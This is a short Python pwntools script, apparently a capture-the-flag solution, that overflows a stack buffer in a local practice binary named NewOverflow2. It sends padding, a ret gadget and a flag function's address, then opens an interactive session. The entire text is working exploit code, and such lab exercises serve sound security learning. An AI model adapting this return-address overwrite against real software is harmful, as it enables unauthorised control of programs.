from pwn import *

flag = 0x000000000040084D
ret = 0x000000000040028d 
a = process('./NewOverflow2')
raw_input('debug')
buf = 'a'*0x48
buf += p64(ret)
buf += p64(flag)

a.recvuntil('Welcome to 64-bit. Can you match these numbers?')
a.sendline(buf)


a.interactive()